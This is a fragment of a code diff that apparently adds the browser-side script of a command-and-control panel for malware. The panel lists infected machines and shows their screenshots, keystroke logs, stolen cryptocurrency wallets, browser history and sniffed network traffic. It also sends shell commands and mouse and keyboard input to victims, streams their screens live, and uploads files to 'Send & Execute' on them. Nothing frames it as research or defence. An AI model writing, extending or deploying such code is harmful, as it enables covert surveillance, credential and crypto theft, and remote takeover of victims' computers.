+                    pointBackgroundColor: chartColors.danger,
+                    pointBorderColor: '#fff',
+                    pointHoverBackgroundColor: '#fff',
+                    pointHoverBorderColor: chartColors.danger
+                }]
+            },
+            options: {
+                ...globalChartConfig,
+                scales: {
+                    r: {
+                        beginAtZero: true,
+                        max: 100,
+                        ticks: {
+                            stepSize: 20,
+                            color: '#94a3b8',
+                            backdropColor: 'transparent'
+                        },
+                        grid: { color: 'rgba(148, 163, 184, 0.2)' },
+                        pointLabels: { color: '#94a3b8' }
+                    }
+                },
+                plugins: {
+                    legend: { display: false }
+                }
+            }
+        });
+
+        // Modal Logic
+        let currentTerminalId = null;
+        
+
+        function sendModalCommand() {
+            const cmd = document.getElementById('modalCmdInput').value;
+             if(!cmd || !currentTerminalId) return;
+             
+             fetch("/admin/command", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').content
+                },
+                body: JSON.stringify({ terminal_id: currentTerminalId, command: cmd, type: 'shell' })
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('cmdOutput').innerHTML += `<div><span class="text-secondary">$</span> ${cmd}</div><div class="text-info">>> Command queued</div>`;
+                document.getElementById('modalCmdInput').value = '';
+            });
+        }
+        
+        // Load screenshots for terminal
+        function loadScreenshots() {
+            fetch(`/api/screenshots/${currentTerminalId}?page=1&per_page=6`)
+                .then(r => r.json())
+                .then(data => {
+                    const gallery = document.getElementById('screenshotGallery');
+                    if (data.screenshots && data.screenshots.length > 0) {
+                        gallery.innerHTML = '';
+                        data.screenshots.forEach(screenshot => {
+                            gallery.innerHTML += `
+                                <div class="col-4">
+                                    <div style="position:relative; aspect-ratio:16/9; background:#000; border-radius:8px; overflow:hidden;">
+                                        <img src="${screenshot.url}" style="width:100%; height:100%; object-fit:cover; cursor:pointer;" onclick="window.open('${screenshot.url}', '_blank')">
+                                        <div style="position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.7); padding:4px 8px; font-size:0.7rem;">
+                                            ${new Date(screenshot.time * 1000).toLocaleString()}
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                    } else {
+                        gallery.innerHTML = '<div class="col-12 text-center text-secondary py-3">No screenshots available</div>';
+                    }
+                });
+        }
+        
+        // Load keylogs
+        function loadKeylogs() {
+            fetch(`/api/keylogs/${currentTerminalId}?page=1`)
+                .then(r => r.json())
+                .then(data => {
+                    const content = document.getElementById('keylogContent');
+                    if (data.keylogs && data.keylogs.length > 0) {
+                        let combined = '';
+                        data.keylogs.forEach(log => {
+                            combined += `\n=== ${new Date(log.timestamp * 1000).toLocaleString()} ===\n${log.content}\n`;
+                        });
+                        content.textContent = combined;
+                    } else {
+                        content.textContent = 'No keylog data available';
+                    }
+                });
+        }
+        
+        // Load telemetry logs
+        function loadTelemetry() {
+            const level = document.getElementById('logLevelFilter').value;
+            const url = `/api/telemetry/${currentTerminalId}${level ? '?level='+level : ''}`;
+            
+            fetch(url)
+                .then(r => r.json())
+                .then(logs => {
+                    const tbody = document.getElementById('telemetryLogs');
+                    if (logs && logs.length > 0) {
+                        tbody.innerHTML = '';
+                        logs.slice(0, 50).forEach(log => {
+                            const levelClass = log.level === 'Error' || log.level === 'Critical' ? 'text-danger' : 
+                                              log.level === 'Warning' ? 'text-warning' : 'text-info';
+                            tbody.innerHTML += `
+                                <tr>
+                                    <td style="white-space:nowrap;">${log.timestamp}</td>
+                                    <td><span class="badge ${levelClass}">${log.level}</span></td>
+                                    <td>${log.module}</td>
+                                    <td style="max-width:300px; text-overflow:ellipsis; overflow:hidden; white-space:nowrap;">${log.message}</td>
+                                </tr>
+                            `;
+                        });
+                    } else {
+                        tbody.innerHTML = '<tr><td colspan="4" class="text-center text-secondary">No logs available</td></tr>';
+                    }
+                });
+        }
+        
+        // Log level filter change
+        document.getElementById('logLevelFilter').addEventListener('change', loadTelemetry);
+        
+        // Load crypto wallets
+        function loadCryptoWallets() {
+            fetch(`/api/crypto/${currentTerminalId}`)
+                .then(r => r.json())
+                .then(data => {
+                    const container = document.getElementById('cryptoWallets');
+                    if (data.wallets && data.wallets.length > 0) {
+                        container.innerHTML = '';
+                        data.wallets.forEach(wallet => {
+                            container.innerHTML += `
+                                <div class="card bg-dark border-secondary mb-2">
+                                    <div class="card-body p-3">
+                                        <div class="d-flex justify-content-between">
+                                            <div>
+                                                <span class="badge bg-warning text-dark">${wallet.type}</span>
+                                                <p class="mb-1 mt-2 font-monospace" style="font-size:0.85rem;">${wallet.address}</p>
+                                                <small class="text-secondary">Balance: ${wallet.balance}</small>
+                                            </div>
+                                            <div class="text-end">
+                                                <small class="text-secondary">${new Date(wallet.timestamp * 1000).toLocaleDateString()}</small>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        
+                        if (data.reports && data.reports.length > 0) {
+                            container.innerHTML += '<hr class="border-secondary"><h6 class="text-white mt-3">Reports</h6>';
+                            data.reports.forEach(report => {
+                                container.innerHTML += `
+                                    <div class="bg-black p-2 rounded mb-2">
+                                        <pre class="text-success m-0" style="font-size:0.75rem; max-height:150px; overflow-y:auto;">< /pre>
+                                    </div>
+                                `;
+                            });
+                        }
+                    } else {
+                        container.innerHTML = '<div class="text-center text-secondary py-3">No cryptocurrency data available</div>';
+                    }
+                });
+        }
+        
+        // Export data function
+        function exportData(type) {
+            const format = prompt('Export format?\n1 = CSV\n2 = JSON', '2') === '1' ? 'csv' : 'json';
+            window.location.href = `/admin/export/${currentTerminalId}/${type}?format=${format}`;
+        }
+        
+        // Update openTerminalModal to load new tabs
+        function openTerminalModal(id) {
+            currentTerminalId = id;
+            document.getElementById('modalTerminalId').innerText = id;
+            
+            // Load Files (existing)
+            fetch(`/admin/files/${id}`)
+                .then(r => r.json())
+                .then(files => {
+                    const tbody = document.getElementById('filesList');
+                    tbody.innerHTML = '';
+                    files.forEach(f => {
+                        let icon = 'bi-file-earmark';
+                        if(f.name.includes('keylog')) icon = 'bi-file-text text-info';
+                        if(f.name.includes('crypto')) icon = 'bi-wallet2 text-warning';
+                        if(f.name.endsWith('.png')) icon = 'bi-image text-success';
+                        
+                        tbody.innerHTML += `
+                            <tr>
+                                <td><i class="bi ${icon} me-2"></i>${f.name}</td>
+                                <td>${(f.size/1024).toFixed(1)} KB</td>
+                                <td>${f.name.split('.').pop()}</td>
+                                <td><a href="${f.url}" class="btn btn-xs btn-outline-light"><i class="bi bi-download"></i></a></td>
+                            </tr>
+                        `;
+                    });
+                });
+                
+            // Load Full System Info
+            fetch(`/admin/terminal?id=${id}`)
+                .then(r => r.json())
+                .then(d => {
+                    const t = d.terminal;
+                    const si = t.system_info || {};
+                    let html = `
+                        <div class="row g-3">
+                            <div class="col-md-6">
+                                <div class="glass-panel p-3">
+                                    <h6 class="text-white"><i class="bi bi-pc-display me-2"></i>System</h6>
+                                    <table class="table table-sm table-dark mb-0">
+                                        <tr><td class="text-secondary">Terminal ID</td><td class="text-white font-monospace">${t.id}</td></tr>
+                                        <tr><td class="text-secondary">OS</td><td class="text-white">${t.os || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Architecture</td><td class="text-white">${t.arch || si.architecture || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Hostname</td><td class="text-white">${t.hostname || si.hostname || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Username</td><td class="text-white">${t.username || si.username || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Processors</td><td class="text-white">${si.processor_count || 'N/A'}</td></tr>
+                                    </table>
+                                </div>
+                            <div class="col-md-6">
+                                <div class="glass-panel p-3">
+                                    <h6 class="text-white"><i class="bi bi-pc-display me-2"></i>System</h6>
+                                    <table class="table table-sm table-dark mb-0">
+                                        <tr><td class="text-secondary">Terminal ID</td><td class="text-white font-monospace">${t.id}</td></tr>
+                                        <tr><td class="text-secondary">OS</td><td class="text-white">${t.os || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Architecture</td><td class="text-white">${t.arch || si.architecture || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Hostname</td><td class="text-white">${t.hostname || si.hostname || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Username</td><td class="text-white">${t.username || si.username || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Processors</td><td class="text-white">${si.processor || si.processor_count || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">GPU</td><td class="text-white">${si.gpu || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Antivirus</td><td class="text-white">${si.antivirus || 'N/A'}</td></tr>
+                                    </table>
+                                </div>
+                                <div class="glass-panel p-3 mt-3">
+                                    <h6 class="text-white"><i class="bi bi-hdd me-2"></i>Disks</h6>
+                                    <div style="max-height: 100px; overflow-y: auto;">
+                                        ${si.disks ? si.disks.map(d => `<div class="d-flex justify-content-between small text-secondary"><span>${d.name}</span><span class="text-white">${d.free} free / ${d.total}</span></div>`).join('') : '<span class="text-secondary small">No disk info</span>'}
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="glass-panel p-3">
+                                    <h6 class="text-white"><i class="bi bi-globe me-2"></i>Network</h6>
+                                    <table class="table table-sm table-dark mb-0">
+                                        <tr><td class="text-secondary">External IP</td><td class="text-white">${t.ip || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Local IP</td><td class="text-white">${si.ip_address || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">MAC Address</td><td class="text-white font-monospace" style="font-size:0.8rem;">${si.mac || si.mac_address || 'N/A'}</td></tr>
+                                        <tr><td class="text-secondary">Last Seen</td><td class="text-white">${new Date(t.last_seen*1000).toLocaleString()}</td></tr>
+                                        <tr><td class="text-secondary">Uptime</td><td class="text-white">${si.system_uptime || 'N/A'}</td></tr>
+                                    </table>
+                                    <div class="mt-2">
+                                        <small class="text-secondary">Interfaces:</small>
+                                        <div style="max-height: 80px; overflow-y: auto;">
+                                             ${si.network ? si.network.map(n => `<div class="small text-secondary">${n.name} <span class="text-white-50">(${n.mac || 'N/A'})</span></div>`).join('') : ''}
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="glass-panel p-3 mt-3">
+                                    <h6 class="text-white"><i class="bi bi-clock-history me-2"></i>Browser History</h6>
+                                     <div style="max-height: 100px; overflow-y: auto;">
+                                        ${si.browser_history ? (Array.isArray(si.browser_history) ? si.browser_history.length + ' entries' : si.browser_history) : '<span class="text-secondary small">N/A</span>'}
+                                     </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    document.getElementById('infoContent').innerHTML = html;
+                });
+            
+            // Load new tabs (lazy load when tab is clicked)
+            document.querySelector('a[href="#tab-screenshots"]').addEventListener('click', loadScreenshots, {once: true});
+            document.querySelector('a[href="#tab-keylogs"]').addEventListener('click', loadKeylogs, {once: true});
+            document.querySelector('a[href="#tab-telemetry"]').addEventListener('click', loadTelemetry, {once: true});
+            document.querySelector('a[href="#tab-crypto"]').addEventListener('click', loadCryptoWallets, {once: true});
+
+            new bootstrap.Modal(document.getElementById('terminalModal')).show();
+        }
+        
+        // Stream Player Logic
+        let streamInterval = null;
+        
+        function startStreamPlayer() {
+            const player = document.getElementById('streamPlayer');
+            const placeholder = document.getElementById('streamPlaceholder');
+            const livetag = document.getElementById('livetag');
+            
+            player.style.display = 'inline-block';
+            placeholder.style.display = 'none';
+            livetag.style.display = 'inline-block';
+            
+            if (streamInterval) clearInterval(streamInterval);
+            
+            streamInterval = setInterval(() => {
+                // Add timestamp to prevent caching
+                player.src = `/api/terminals/${currentTerminalId}/live-feed?t=${new Date().getTime()}`;
+            }, 200); // 5 FPS
+        }
+        
+        function stopStreamPlayer() {
+            if (streamInterval) clearInterval(streamInterval);
+            document.getElementById('streamPlayer').style.display = 'none';
+            document.getElementById('streamPlaceholder').style.display = 'block';
+             document.getElementById('livetag').style.display = 'none';
+        }
+
+        // Remote Control functions
+        function sendRemoteControl(action, param = null) {
+            
+            // Hook for player start/stop
+            if (action === 'screen_capture_start') {
+                startStreamPlayer();
+            } else if (action === 'screen_capture_stop') {
+                stopStreamPlayer();
+            }
+
+            // Generic command sender
+            if (!currentTerminalId) return;
+            
+            let payload = { terminal_id: currentTerminalId };
+            
+            // Map simple actions to commands if needed, or send raw
+            // Here we use the generic command endpoint for sniffer control as well
+            if (action === 'sniffer_control') {
+                 // Send as a command to be queued
+                 fetch('/admin/terminal/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
+                    },
+                    body: JSON.stringify({
+                        terminal_id: currentTerminalId,
+                        command: param, // start/stop
+                        type: 'sniffer_control'
+                    })
+                })
+                .then(r => r.json())
+                .then(d => {
+                    if(d.status === 'success') alert('Sniffer command sent: ' + param);
+                    else alert('Error sending sniffer command');
+                });
+                return;
+            }
+            
+            // ... existing remote control logic (mouse/keyboard) which uses different endpoint or logic?
+            // The existing function continues...
+            
+            switch(action) {
+                case 'mouse_move':
+                    const x = document.getElementById('mouseX').value;
+                    const y = document.getElementById('mouseY').value;
+                    if (!x || !y) { alert('Enter X and Y coordinates'); return; }
+                    payload.command = JSON.stringify({ action: 'mouse_move', x: parseInt(x), y: parseInt(y) });
+                    payload.type = 'remote_control';
+                    break;
+                    
+                case 'mouse_click':
+                    payload.command = JSON.stringify({ action: 'mouse_click', button: param });
+                    payload.type = 'remote_control';
+                    break;
+                    
+                case 'keyboard_input':
+                    const text = document.getElementById('keyboardText').value;
+                    if (!text) { alert('Enter text to type'); return; }
+                    payload.command = JSON.stringify({ action: 'keyboard_input', text: text });
+                    payload.type = 'remote_control';
+                    document.getElementById('keyboardText').value = '';
+                    break;
+                    
+                case 'special_key':
+                    payload.command = JSON.stringify({ action: 'special_key', key: param });
+                    payload.type = 'remote_control';
+                    break;
+                    
+                case 'screen_capture_start':
+                    const interval = document.getElementById('captureInterval').value;
+                    payload.command = JSON.stringify({ action: 'screen_capture', start: true, interval: parseInt(interval) });
+                    payload.type = 'remote_control';
+                    break;
+                    
+                case 'screen_capture_stop':
+                    payload.command = JSON.stringify({ action: 'screen_capture', start: false });
+                    payload.type = 'remote_control';
+                    break;
+            }
+            
+            fetch("/admin/command", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').content
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .then(data => {
+                const toast = document.createElement('div');
+                toast.className = 'position-fixed bottom-0 end-0 p-3';
+                toast.innerHTML = `
+                    <div class="toast show bg-success text-white">
+                        <div class="toast-body"><i class="bi bi-check-circle me-2"></i>Command queued: ${action}</div>
+                    </div>
+                `;
+                document.body.appendChild(toast);
+                setTimeout(() => toast.remove(), 2000);
+            });
+        }
+        
+        // Auto-refresh terminal list
+        let terminalRefreshId = null;
+        
+        function refreshTerminalList() {
+            fetch('/api/terminals')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.terminals) {
+                        // Update count badges
+                        document.querySelectorAll('.stat-value')[0].textContent = data.terminals.filter(t => t.is_online).length;
+                        document.querySelectorAll('.stat-value')[1].textContent = data.count;
+                    }
+                });
+        }
+        
+        // Refresh terminal list every 30 seconds
+        terminalRefreshId = setInterval(refreshTerminalList, 30000);
+        
+        // Add refresh button to terminal list header
+        document.querySelector('.glass-panel h5').innerHTML += ' <button class="btn btn-sm btn-outline-light ms-2" onclick="refreshTerminalList(); location.reload();"><i class="bi bi-arrow-clockwise"></i></button>';
+        
+        // Send file to terminal function
+        function sendFileToTerminal() {
+            if (!currentTerminalId) {
+                alert('No terminal selected');
+                return;
+            }
+            
+            const fileInput = document.getElementById('payloadFile');
+            if (!fileInput.files.length) {
+                alert('Please select a file to send');
+                return;
+            }
+            
+            const file = fileInput.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('terminal_id', currentTerminalId);
+            
+            // Show loading state
+            const btn = event.target;
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner-border spinner-border-sm me-1"></span>Uploading...';
+            
+            fetch('/admin/send-payload', {
+                method: 'POST',
+                headers: {
+                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
+                },
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="bi bi-send me-1"></i>Send & Execute';
+                
+                if (data.status === 'success') {
+                    const toast = document.createElement('div');
+                    toast.className = 'position-fixed bottom-0 end-0 p-3';
+                    toast.innerHTML = `
+                        <div class="toast show bg-success text-white">
+                            <div class="toast-body"><i class="bi bi-check-circle me-2"></i>File queued for delivery: ${file.name}</div>
+                        </div>
+                    `;
+                    document.body.appendChild(toast);
+                    setTimeout(() => toast.remove(), 3000);
+                    
+                    // Reset form
+                    fileInput.value = '';
+                    new bootstrap.Collapse(document.getElementById('sendFileForm')).hide();
+                } else {
+                    alert('Error: ' + (data.message || 'Unknown error'));
+                }
+            })
+            .catch(err => {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="bi bi-send me-1"></i>Send & Execute';
+                alert('Upload failed: ' + err.message);
+            });
+        }
+
+        function loadNetworkLogs() {
+            if(!currentTerminalId) return;
+            document.getElementById('networkLogContent').innerText = 'Loading logs...';
+            
+            fetch(`/admin/files/${currentTerminalId}`)
+                .then(r => r.json())
+                .then(files => {
+                    const logs = files.filter(f => f.name.includes('network_sniff') || f.name.includes('network_log'));
+                    if(logs.length === 0) {
+                        document.getElementById('networkLogContent').innerText = 'No network logs found.';
+                        return;
+                    }
+                    // Sort logs (latest first). Assumption: file API returns sorted or we relying on name/order
+                    // Since specific sort might differ, just taking top ones
+                    
+                    const targetFiles = logs.slice(0, 5); 
+                    
+                    Promise.all(targetFiles.map(f => fetch(f.url).then(r => r.text())))
+                        .then(texts => {
+                             document.getElementById('networkLogContent').innerText = texts.join('\n========== LOG SEPERATOR ==========\n');
+                             // Scroll to bottom? No, top is better for latest? Log usually appended.
+                        });
+                })
+                .catch(e => {
+                     document.getElementById('networkLogContent').innerText = 'Error loading logs: ' + e;
+                });
+        }
+    </script>
+</body>
+</html>
